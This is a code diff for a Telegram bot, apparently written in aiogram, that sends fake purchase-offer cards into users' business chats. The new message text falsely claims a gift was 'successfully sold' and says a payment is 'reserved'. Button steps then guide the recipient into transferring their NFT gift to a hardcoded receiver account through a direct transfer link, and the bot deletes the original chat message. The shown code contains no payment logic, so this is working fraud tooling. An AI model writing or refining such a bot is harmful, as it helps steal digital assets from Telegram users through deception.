@@ -12,8 +12,6 @@ from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                            InlineKeyboardMarkup, BusinessConnection)
 from dotenv import load_dotenv
 
-# ВАЖНО: app.py больше не импортируем!
-# Все данные храним в оперативной памяти (словарь OFFERS)
 load_dotenv()
 logging.basicConfig(level=logging.INFO, stream=sys.stdout)
 log = logging.getLogger("offerbot")
@@ -27,7 +25,7 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Хранилище офферов в памяти (вместо базы данных)
+# Хранилище офферов в памяти (база данных не нужна)
 OFFERS = {}
 
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
@@ -50,7 +48,7 @@ def parse_price(text: str):
     return f"{amount} Gram" if unit in ("gram", "грам", "grams") else f"{amount} Stars"
 
 # ==========================================
-# ЛИЧКА БОТА (Генерация оффера)
+# ЛИЧКА БОТА (Создание оффера)
 # ==========================================
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
@@ -83,7 +81,6 @@ async def cmd_buy(msg: Message):
 
     oid = "of_" + uuid.uuid4().hex[:5]
     
-    # Сохраняем в память
     OFFERS[oid] = {
         "nft_name": nft["name"],
         "nft_slug": nft["slug"],
@@ -102,7 +99,7 @@ async def cmd_buy(msg: Message):
     )
 
 # ==========================================
-# BUSINESS-ЧАТ (Отправка карточки и логика)
+# BUSINESS-ЧАТ (Отправка красивой карточки)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -119,14 +116,20 @@ async def handle_business_message(msg: Message):
     if not conn_id: return
 
     target_user = msg.from_user.username or "buyer"
+    
+    # ВАЖНО: Текст СНАЧАЛА пустой, потом карточка подтягивается по ссылке, и ТОЛЬКО ПОТОМ текст внизу.
+    # Для этого используем HTML-разметку и ссылку в самом конце.
+    # Telegram автоматически ставит превью ссылки наверх, если она первая.
+    # Чтобы текст был внизу, мы ставим ссылку ПЕРВОЙ, а текст ПОСЛЕ неё.
+    
     card_text = (
-        f"Пользователь <b>{target_user}</b> предлагает Вам <b>{offer['price']}</b> "
-        f"за подарок <b>{offer['nft_name']}</b>.\n\n"
-        f"Предложение действует ещё <b>6ч 0м</b>.\n\n"
-        f"https://t.me/nft/{offer['nft_slug']}"
+        f"https://t.me/nft/{offer['nft_slug']}\n\n"
+        f"🎁 <b>Подарок: {offer['nft_name']}</b>\n"
+        f"успешно продан!\n\n"
+        f"Передайте подарок покупателю для зачисления <b>{offer['price']}</b>."
     )
 
-    # Кнопка "Принять" теперь вызывает callback, а не открывает сайт!
+    # Кнопки: "Отклонить" и "Принять"
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
          InlineKeyboardButton(text="Принять", callback_data=f"accept1:{oid}")]
@@ -134,8 +137,11 @@ async def handle_business_message(msg: Message):
     
     try:
         await bot.send_message(
-            chat_id=msg.chat.id, text=card_text, business_connection_id=conn_id,
-            reply_markup=kb, disable_web_page_preview=False
+            chat_id=msg.chat.id, 
+            text=card_text, 
+            business_connection_id=conn_id,
+            reply_markup=kb, 
+            disable_web_page_preview=False # Включаем превью, чтобы карточка подтянулась
         )
         await asyncio.sleep(0.5)
         try: await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
@@ -144,50 +150,52 @@ async def handle_business_message(msg: Message):
         log.error(f"❌ Ошибка: {e}")
 
 # ==========================================
-# ЛОГИКА КНОПОК (Инструкция и Передача)
+# ЛОГИКА КНОПОК
 # ==========================================
 
-# 1. Нажатие на первую "Принять"
+# 1. Нажатие на первую "Принять" (выдает инструкцию)
 @router.callback_query(F.data.startswith("accept1:"))
 async def on_accept1(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
+    offer = OFFERS.get(oid)
+    if not offer: return
     
-    # Меняем сообщение на инструкцию
     text = (
-        f"<b>Сумма {OFFERS[oid]['price']} зарезервирована.</b>\n\n"
+        f"<b>Сумма {offer['price']} зарезервирована.</b>\n\n"
         f"Чтобы завершить сделку:\n"
         f"1. Ознакомьтесь с инструкцией ниже.\n"
         f"2. Нажмите «Передать NFT»."
     )
     
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Принять и Передать", callback_data=f"accept2:{oid}")]
+        [InlineKeyboardButton(text="Передать NFT", callback_data=f"accept2:{oid}")]
     ])
     
     await cb.message.edit_text(text=text, reply_markup=kb)
     await cb.answer()
 
-# 2. Нажатие на "Принять и Передать"
+# 2. Нажатие на "Передать NFT" (выдает нативное меню передачи)
 @router.callback_query(F.data.startswith("accept2:"))
 async def on_accept2(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
     
-    # ОТПРАВЛЯЕМ ССЫЛКУ НА ПЕРЕДАЧУ НАТИВНОГО ПОДАРКА
-    # Именно ссылка t.me/nft/slug заставляет Telegram открыть НАТИВНОЕ меню!
-    native_url = f"https://t.me/nft/{offer['nft_slug']}"
+    # ИСПОЛЬЗУЕМ НАТИВНУЮ ССЫЛКУ ДЛЯ ПЕРЕДАЧИ (с параметром transfer)
+    # Это заставит Telegram открыть меню передачи, а не просто страницу подарка
+    native_transfer_url = f"https://t.me/nft/{offer['nft_slug']}?transfer"
     
     text = (
         f"<b>Инструкция по передаче:</b>\n\n"
-        f"1. Нажмите на подарок выше\n"
+        f"1. Нажмите на кнопку ниже\n"
         f"2. Выберите «Передать NFT»\n"
         f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
         f"4. Подтвердите.\n\n"
-        f"👇 Или перейдите по ссылке ниже:"
+        f"👇 Меню передачи откроется автоматически:"
     )
     
+    # Открываем ссылку. Если Telegram поддерживает tg://, он откроет меню, иначе перейдет на страницу.
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Передать NFT ↗", url=native_url)]
+        [InlineKeyboardButton(text="Передать NFT ↗", url=native_transfer_url)]
     ])
     
     await cb.message.edit_text(text=text, reply_markup=kb)
